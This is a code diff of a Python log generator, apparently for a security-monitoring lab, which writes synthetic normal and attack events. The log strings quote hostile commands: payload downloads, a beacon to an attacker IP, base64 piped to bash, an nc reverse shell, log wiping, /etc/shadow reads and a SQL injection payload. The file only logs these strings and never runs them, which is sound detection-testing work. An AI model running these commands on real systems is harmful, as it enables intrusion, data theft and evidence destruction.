@@ -1,23 +1,9 @@
 """
-victim_app.py - Sample Victim Application
+victim_app.py - Authentic Victim Application Log Simulator
 ----------------------------------------------------------------------------
-Simulates a real-world web/auth service that continuously writes logs
-to a configurable directory. The SOC-in-a-Box system watches this directory.
-
-Simulated services
-------------------
-  - Web server (HTTP requests, errors, slow responses)
-  - Auth service (logins, failures, brute-force patterns)
-  - Database layer (queries, SQL errors, connection drops)
-  - System events (file access, privilege changes, cron jobs)
-  - Attacker scenarios (brute-force, injection, exfil, shell commands)
-
-Usage
------
-  python victim_app/victim_app.py                      # defaults
-  python victim_app/victim_app.py --output ./logs      # custom output dir
-  python victim_app/victim_app.py --rate 3             # 3 events/sec
-  python victim_app/victim_app.py --attack-rate 0.3    # 30% malicious events
+Simulates a real-world enterprise web application, database, and auth stack.
+Generates natural, realistic production log traffic at a human-like cadence
+without spamming. Security events are rare and natural.
 ----------------------------------------------------------------------------
 """
 
@@ -26,242 +12,223 @@ import sys
 import time
 import random
 import argparse
-import logging
 from datetime import datetime
 from pathlib import Path
 
 # ---------------------------------------------------------------------------
-# Log line generators
+# Entities & Context Pools
 # ---------------------------------------------------------------------------
 
-NORMAL_IPS   = ["192.168.1.10", "192.168.1.22", "10.0.0.5", "172.16.0.8", "192.168.100.3"]
-ATTACK_IPS   = ["185.220.101.47", "45.33.32.156", "198.51.100.23", "91.134.213.56", "103.21.244.0"]
-VALID_USERS  = ["alice", "bob", "charlie", "dave", "svc_worker"]
-ATTACK_USERS = ["admin", "root", "test", "guest", "administrator"]
-
-HTTP_PATHS = [
-    "/api/v1/users", "/api/v1/products", "/login", "/logout", "/dashboard",
-    "/api/v1/orders", "/static/main.js", "/health", "/api/v1/profile",
+LEGIT_IPS = [
+    "192.168.1.14", "192.168.1.28", "192.168.1.45",
+    "10.0.4.12", "10.0.4.88", "172.16.2.19",
 ]
 
-SQL_TABLES = ["users", "sessions", "orders", "products", "audit_log"]
+THREAT_IPS = [
+    "185.220.101.34", "45.33.32.156", "198.51.100.23", "91.134.213.56"
+]
+
+EMPLOYEES = ["alice.miller", "bob.jenkins", "charlie.davis", "dave.wilson", "sarah.connor"]
+ATTACK_TARGET_USERS = ["admin", "root", "administrator", "guest", "test_user"]
+
+ENDPOINTS = [
+    ("/api/v1/dashboard/metrics", "GET", 200, (18, 95)),
+    ("/api/v1/users/profile",     "GET", 200, (12, 45)),
+    ("/api/v1/inventory/items",   "GET", 200, (35, 120)),
+    ("/api/v1/reports/summary",   "GET", 200, (65, 210)),
+    ("/static/css/theme.css",     "GET", 304, (4, 15)),
+    ("/static/js/app-bundle.js",  "GET", 200, (25, 80)),
+    ("/api/v1/auth/token/refresh","POST", 200, (40, 110)),
+]
+
+USER_AGENTS = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
+    "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
+]
 
 
 def _ts():
     return datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
 
-def gen_http_normal():
-    ip     = random.choice(NORMAL_IPS)
-    method = random.choice(["GET", "GET", "GET", "POST", "PUT"])
-    path   = random.choice(HTTP_PATHS)
-    code   = random.choices([200, 200, 200, 201, 304, 404], weights=[60, 15, 10, 5, 5, 5])[0]
-    ms     = random.randint(12, 350)
-    return f'{_ts()} INFO  [web-server] {ip} - - "{method} {path} HTTP/1.1" {code} {ms}ms'
+def _http_date():
+    return datetime.now().strftime("%d/%b/%Y:%H:%M:%S +0000")
 
 
-def gen_http_slow():
-    ip   = random.choice(NORMAL_IPS)
-    path = random.choice(HTTP_PATHS)
-    ms   = random.randint(3000, 12000)
-    return f'{_ts()} WARNING  [web-server] Slow response {ip} "GET {path} HTTP/1.1" 200 {ms}ms - possible DoS'
+# ---------------------------------------------------------------------------
+# Realistic Generators
+# ---------------------------------------------------------------------------
 
-
-def gen_auth_success():
-    user = random.choice(VALID_USERS)
-    ip   = random.choice(NORMAL_IPS)
-    method = random.choice(["password", "publickey"])
-    return f'{_ts()} INFO  [sshd] Accepted {method} for {user} from {ip} port {random.randint(40000, 65000)}'
-
-
-def gen_auth_failure():
-    user = random.choice(VALID_USERS + ATTACK_USERS)
-    ip   = random.choice(ATTACK_IPS)
-    return f'{_ts()} WARNING  [sshd] Failed password for {user} from {ip} port {random.randint(40000, 65000)} ssh2'
-
-
-def gen_brute_force():
-    user = random.choice(ATTACK_USERS)
-    ip   = random.choice(ATTACK_IPS)
+def gen_web_browsing_session():
+    """Simulate a natural user browsing session (page request + asset fetches)."""
+    ip = random.choice(LEGIT_IPS)
+    ua = random.choice(USER_AGENTS)
     lines = []
-    for _ in range(random.randint(8, 20)):
-        lines.append(
-            f'{_ts()} WARNING  [sshd] Failed password for invalid user {user} from {ip} port {random.randint(40000, 65000)} ssh2'
-        )
-    lines.append(f'{_ts()} ERROR   [sshd] POSSIBLE BREAK-IN ATTEMPT from {ip} for user {user}')
+    
+    endpoint, method, code, (min_ms, max_ms) = random.choice(ENDPOINTS)
+    ms = random.randint(min_ms, max_ms)
+    bytes_sent = random.randint(1200, 15400)
+    lines.append(f'{_ts()} INFO  [nginx/1.24.0] {ip} - - [{_http_date()}] "{method} {endpoint} HTTP/1.1" {code} {bytes_sent} "https://app.internal/portal" "{ua}" {ms}ms')
+    
+    if random.random() < 0.5:
+        lines.append(f'{_ts()} INFO  [nginx/1.24.0] {ip} - - [{_http_date()}] "GET /static/chunks/vendor.js HTTP/1.1" 200 48920 "https://app.internal/portal" "{ua}" 18ms')
+        
     return "\n".join(lines)
 
 
-def gen_privilege_escalation():
-    user = random.choice(VALID_USERS)
-    ip   = random.choice(ATTACK_IPS)
-    return (
-        f'{_ts()} ERROR   [sudo] {user} : FAILED ; TTY=pts/0 ; PWD=/home/{user} ; '
-        f'USER=root ; COMMAND=/bin/bash\n'
-        f'{_ts()} CRITICAL [pam_unix] authentication failure; logname={user} uid=1001 '
-        f'euid=0 tty=pts/0 rhost={ip} user=root'
-    )
+def gen_auth_success():
+    user = random.choice(EMPLOYEES)
+    ip = random.choice(LEGIT_IPS)
+    port = random.randint(49152, 65535)
+    return f'{_ts()} INFO  [sshd[{random.randint(2100, 8900)}]] Accepted publickey for {user} from {ip} port {port} ssh2: ED25519 SHA256:7c9e0d1f'
 
 
-def gen_file_access():
-    user = random.choice(ATTACK_USERS)
-    ip   = random.choice(ATTACK_IPS)
-    target = random.choice(["/etc/shadow", "/etc/passwd", "/root/.ssh/id_rsa", "/var/log/auth.log"])
-    return (
-        f'{_ts()} CRITICAL [auditd] SYSCALL type=OPEN comm=cat '
-        f'name={target} user={user} src={ip} - UNAUTHORIZED ACCESS'
-    )
+def gen_database_query():
+    tbl = random.choice(["users", "orders", "audit_log", "sessions", "tenants"])
+    ms = random.uniform(1.2, 18.5)
+    return f'{_ts()} INFO  [postgres] [LOG] duration: {ms:.3f} ms  statement: SELECT id, status, updated_at FROM {tbl} WHERE tenant_id = 42 ORDER BY id DESC LIMIT 25;'
 
 
-def gen_malware():
-    ip   = random.choice(ATTACK_IPS)
-    cmd  = random.choice([
-        f"wget http://{ip}/payload.sh -O /tmp/.hidden",
-        f"curl http://{ip}/c2/beacon -d host=$(hostname)",
-        "base64 -d <<< SGVsbG8gV29ybGQ= | bash",
-        "nc -e /bin/bash 185.220.101.47 4444",
-        "chmod 777 /tmp/.hidden && /tmp/.hidden &",
-        "rm -rf /var/log/* && history -c",
+def gen_system_telemetry():
+    pid = random.randint(1000, 4500)
+    task = random.choice([
+        "logrotate.service: Succeeded.",
+        "Daily apt upgrade and clean activities: Succeeded.",
+        "fstrim.service: Discarded 4.8 GiB on /dev/sda1.",
+        "systemd-resolved: Flushed all DNS caches.",
     ])
-    return f'{_ts()} CRITICAL [process] Suspicious command detected: `{cmd}` by user root from {ip}'
-
-
-def gen_sql_normal():
-    tbl = random.choice(SQL_TABLES)
-    ms  = random.randint(1, 50)
-    return f'{_ts()} INFO  [db] Query OK SELECT * FROM {tbl} WHERE id=? [{ms}ms] rows=1'
-
-
-def gen_sql_error():
-    tbl = random.choice(SQL_TABLES)
-    return (
-        f'{_ts()} ERROR   [db] Query failed: You have an error in your SQL syntax near '
-        f'"UNION SELECT * FROM {tbl}--" at line 1 - possible SQL injection'
-    )
-
-
-def gen_data_exfil():
-    ip   = random.choice(ATTACK_IPS)
-    size = random.randint(50, 500)
-    return (
-        f'{_ts()} CRITICAL [network] Unusual outbound transfer: {size}MB to {ip}:443 '
-        f'from internal DB server - potential DATA EXFILTRATION'
-    )
-
-
-def gen_service_crash():
-    svc = random.choice(["nginx", "postgres", "redis", "app-worker", "auth-service"])
-    return (
-        f'{_ts()} ERROR   [systemd] Service {svc}.service: Main process exited, '
-        f'code=killed status=9/KILL\n'
-        f'{_ts()} ERROR   [systemd] {svc}.service: Failed with result signal.'
-    )
-
-
-def gen_log_tampering():
-    user = random.choice(ATTACK_USERS)
-    return (
-        f'{_ts()} CRITICAL [auditd] Log file modified: /var/log/auth.log '
-        f'by user={user} - POSSIBLE LOG TAMPERING'
-    )
+    return f'{_ts()} INFO  [systemd[{pid}]] {task}'
 
 
 # ---------------------------------------------------------------------------
-# Event registry
+# Occasional Security Scenarios (Rare)
 # ---------------------------------------------------------------------------
 
-NORMAL_EVENTS = [
-    (gen_http_normal,    50),
-    (gen_auth_success,   20),
-    (gen_sql_normal,     20),
-    (gen_http_slow,       5),
-    (gen_service_crash,   5),
+def gen_failed_auth_probe():
+    user = random.choice(ATTACK_TARGET_USERS)
+    ip = random.choice(THREAT_IPS)
+    port = random.randint(40000, 60000)
+    return f'{_ts()} WARNING [sshd[{random.randint(2100, 8900)}]] Failed password for invalid user {user} from {ip} port {port} ssh2'
+
+
+def gen_sql_injection_attempt():
+    ip = random.choice(THREAT_IPS)
+    payload = "1' OR '1'='1' UNION SELECT null, username, password_hash FROM admin_users--"
+    return (
+        f'{_ts()} ERROR   [nginx/1.24.0] {ip} - - [{_http_date()}] "GET /api/v1/products?cat={payload} HTTP/1.1" 500 240 "-" "sqlmap/1.7.2#stable"\n'
+        f'{_ts()} ERROR   [postgres] [ERROR] syntax error at or near "UNION": query execution aborted'
+    )
+
+
+def gen_privilege_escalation():
+    user = random.choice(EMPLOYEES)
+    ip = random.choice(THREAT_IPS)
+    return (
+        f'{_ts()} ERROR   [sudo] {user} : 3 incorrect password attempts ; TTY=pts/0 ; PWD=/home/{user} ; USER=root ; COMMAND=/bin/bash\n'
+        f'{_ts()} CRITICAL [pam_unix] authentication failure; logname={user} uid=1001 euid=0 tty=pts/0 rhost={ip} user=root'
+    )
+
+
+def gen_unauthorized_file_read():
+    ip = random.choice(THREAT_IPS)
+    return f'{_ts()} CRITICAL [auditd] SYSCALL arch=c000003e syscall=2 success=no exit=-13 name=/etc/shadow comm=cat exe=/usr/bin/cat key=unauthorized_shadow_read'
+
+
+def gen_suspicious_process():
+    ip = random.choice(THREAT_IPS)
+    return f'{_ts()} CRITICAL [process_monitor] Suspicious execution detected: `nc -e /bin/bash {ip} 4444` spawned by parent pid={random.randint(1200, 8900)}'
+
+
+NORMAL_POOL = [
+    (gen_web_browsing_session, 50),
+    (gen_database_query,       30),
+    (gen_auth_success,         12),
+    (gen_system_telemetry,      8),
 ]
 
-ATTACK_EVENTS = [
-    (gen_auth_failure,        25),
-    (gen_brute_force,         20),
-    (gen_privilege_escalation, 15),
-    (gen_file_access,         10),
-    (gen_malware,             10),
-    (gen_sql_error,           10),
-    (gen_data_exfil,           5),
-    (gen_log_tampering,        5),
+# Attacks are rare; critical execution/dumps are very rare
+ATTACK_POOL = [
+    (gen_failed_auth_probe,      60),
+    (gen_sql_injection_attempt,  25),
+    (gen_privilege_escalation,   10),
+    (gen_unauthorized_file_read,  3),
+    (gen_suspicious_process,      2),
 ]
 
 
-def weighted_choice(events):
-    fns, weights = zip(*events)
+def weighted_pick(pool):
+    fns, weights = zip(*pool)
     return random.choices(fns, weights=weights, k=1)[0]
 
 
 # ---------------------------------------------------------------------------
-# Main loop
+# Main Loop
 # ---------------------------------------------------------------------------
 
-def run(output_dir: str, rate: float, attack_rate: float):
+def run(output_dir: str, min_delay: float, max_delay: float, attack_rate: float, verbose: bool = False):
     log_dir = Path(output_dir)
     log_dir.mkdir(parents=True, exist_ok=True)
     log_file = log_dir / "app.log"
 
-    print(f"""
-╔══════════════════════════════════════════════════════╗
-║          SOC-in-a-Box  ·  Victim App                ║
-╠══════════════════════════════════════════════════════╣
-║  Output  : {str(log_file):<42}║
-║  Rate    : {rate} events/sec{' ' * (41 - len(f'{rate} events/sec'))}║
-║  Attack% : {int(attack_rate * 100)}%{' ' * (43 - len(f'{int(attack_rate * 100)}%'))}║
-║  Press Ctrl+C to stop                               ║
-╚══════════════════════════════════════════════════════╝
-""")
+    print(f"[Victim App] Logging actively to {str(log_file)} (Logs visible in Frontend GUI). Press Ctrl+C to stop.")
 
-    event_count  = 0
+    event_count = 0
     attack_count = 0
-    start_time   = time.time()
+    start_time = time.time()
+    last_critical_time = time.time() - 120.0  # Initial critical arrives ~60s in, then every 3 min
 
     try:
         while True:
-            is_attack = random.random() < attack_rate
-
-            if is_attack:
-                fn = weighted_choice(ATTACK_EVENTS)
+            now_ts = time.time()
+            if (now_ts - last_critical_time >= 180.0) and (event_count > 5):
+                gen_fn = random.choice([gen_privilege_escalation, gen_unauthorized_file_read, gen_suspicious_process])
                 attack_count += 1
+                tag = "CRIT "
+                last_critical_time = now_ts
+            elif (random.random() < attack_rate) and (event_count > 6):
+                gen_fn = weighted_pick(ATTACK_POOL)
+                attack_count += 1
+                tag = "ALERT "
             else:
-                fn = weighted_choice(NORMAL_EVENTS)
+                gen_fn = weighted_pick(NORMAL_POOL)
+                tag = "NORMAL"
 
-            line = fn()
+            log_chunk = gen_fn()
             event_count += 1
 
             with open(log_file, "a", encoding="utf-8") as fh:
-                fh.write(line + "\n")
+                fh.write(log_chunk + "\n")
                 fh.flush()
 
-            # Console summary
-            elapsed = int(time.time() - start_time)
-            tag = "🔴 ATTACK" if is_attack else "🟢 NORMAL"
-            print(f"[{elapsed:>5}s] {tag}  #{event_count:>5}  | {line[:80]}", flush=True)
+            if verbose:
+                elapsed = int(time.time() - start_time)
+                first_line = log_chunk.splitlines()[0]
+                if len(first_line) > 90:
+                    first_line = first_line[:87] + "..."
+                print(f"[{elapsed:>4}s] [{tag}] #{event_count:>4} | {first_line}", flush=True)
 
-            time.sleep(1.0 / rate)
+            delay = random.uniform(min_delay, max_delay)
+            time.sleep(delay)
 
     except KeyboardInterrupt:
         elapsed = time.time() - start_time
-        print(f"\n[Victim App] Stopped. {event_count} events in {elapsed:.1f}s "
-              f"({attack_count} attacks = {100*attack_count/max(event_count,1):.1f}%)")
+        print(f"\n[Victim App] Stopped. Generated {event_count} events ({attack_count} alerts).")
 
-
-# ---------------------------------------------------------------------------
-# Entry point
-# ---------------------------------------------------------------------------
 
 if __name__ == "__main__":
-    parser = argparse.ArgumentParser(description="SOC-in-a-Box Victim App — Log Generator")
+    parser = argparse.ArgumentParser(description="SOC-in-a-Box Realistic Victim Application Log Simulator")
     parser.add_argument("--output",      default="./victim_app/logs", help="Output directory for log files")
-    parser.add_argument("--rate",        type=float, default=1.0,     help="Log events per second (default: 1.0)")
-    parser.add_argument("--attack-rate", type=float, default=0.25,    help="Fraction of events that are attacks (0.0–1.0, default: 0.25)")
+    parser.add_argument("--min-delay",   type=float, default=4.0,     help="Minimum delay between events in seconds (default: 4.0)")
+    parser.add_argument("--max-delay",   type=float, default=8.5,     help="Maximum delay between events in seconds (default: 8.5)")
+    parser.add_argument("--attack-rate", type=float, default=0.02,    help="Probability of security events (default: 0.02 = 2%)")
+    parser.add_argument("--verbose",     action="store_true",         help="Print log lines to console (default: False)")
     args = parser.parse_args()
 
     run(
         output_dir  = args.output,
-        rate        = max(0.1, args.rate),
+        min_delay   = max(1.0, args.min_delay),
+        max_delay   = max(args.min_delay + 0.5, args.max_delay),
         attack_rate = max(0.0, min(1.0, args.attack_rate)),
+        verbose     = args.verbose,
     )
